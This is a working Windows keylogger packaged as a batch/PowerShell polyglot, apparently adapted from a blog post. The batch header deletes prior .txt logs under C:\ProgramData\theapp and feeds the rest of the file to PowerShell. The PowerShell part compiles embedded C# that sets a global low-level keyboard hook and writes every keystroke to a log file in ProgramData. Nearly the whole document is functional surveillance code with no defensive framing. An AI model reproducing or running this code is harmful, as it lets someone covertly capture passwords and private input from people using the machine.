;@echo off
;del /s "C:\ProgramData\theapp\*.txt"
;Findstr -rbv ; %0 | powershell -c -
;goto:sCode

# Extracted from https://hinchley.net/2013/11/03/creating-a-key-logger-via-a-global-system-hook-using-powershell/
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;namespace KeyLogger {
public static class Program {
private const int WH_KEYBOARD_LL = 13;
private const int WM_KEYDOWN = 0x0100;private const string logFileName = "C:/ProgramData/theapp/log.txt";
private static StreamWriter logFile;private static HookProc hookProc = HookCallback;
private static IntPtr hookId = IntPtr.Zero;

public static void Main() {


logFile = File.AppendText(logFileName);
logFile.AutoFlush = true;
hookId = SetHook(hookProc);
Application.Run();
UnhookWindowsHookEx(hookId);
}
private static IntPtr SetHook(HookProc hookProc) {
IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
}
private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
int vkCode = Marshal.ReadInt32(lParam);
if (vkCode == 13){
	logFile.WriteLine();
}
if (vkCode == 32){
	logFile.Write(" ");
}
if (vkCode == 187){
	logFile.Write("+");
}
if (vkCode == 188){
	logFile.Write(",");
}
if (vkCode == 189){
	logFile.Write("-");
}
if (vkCode == 190){
	logFile.Write(".");
}
if (vkCode == 96){
	logFile.Write("0");
}
if (vkCode == 97){
	logFile.Write("1");
}
if (vkCode == 98){
	logFile.Write("2");
}
if (vkCode == 99){
	logFile.Write("3");
}
if (vkCode == 100){
	logFile.Write("4");
}
if (vkCode == 101){
	logFile.Write("5");
}
if (vkCode == 102){
	logFile.Write("6");
}
if (vkCode == 103){
	logFile.Write("7");
}
if (vkCode == 104){
	logFile.Write("8");
}
if (vkCode == 105){
	logFile.Write("9");
}
if (vkCode == 96 || vkCode == 97 || vkCode == 98 || vkCode == 99 || vkCode == 100 || vkCode == 101 || vkCode == 102 || vkCode == 103 || vkCode == 104 || vkCode == 105 || vkCode == 187 || vkCode == 188 || vkCode == 189 || vkCode == 190 || vkCode == 173 || vkCode == 174 || vkCode == 175 || vkCode == 176 || vkCode == 177 || vkCode == 178 || vkCode == 179 || vkCode == 13 || vkCode == 27 || vkCode == 32 ||vkCode == 33 || vkCode == 34 || vkCode == 35 || vkCode == 36 || vkCode == 37 || vkCode == 38 || vkCode == 39 || vkCode == 40){
}
else{
	logFile.Write((Keys)vkCode);
}
}
return CallNextHookEx(hookId, nCode, wParam, lParam);
}
[DllImport("user32.dll")]
private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll")]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("user32.dll")]
private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
[DllImport("kernel32.dll")]
private static extern IntPtr GetModuleHandle(string lpModuleName);
}
}
"@ -ReferencedAssemblies System.Windows.Forms
[KeyLogger.Program]::Main();
#...

;:sCode 
;goto :eof
pause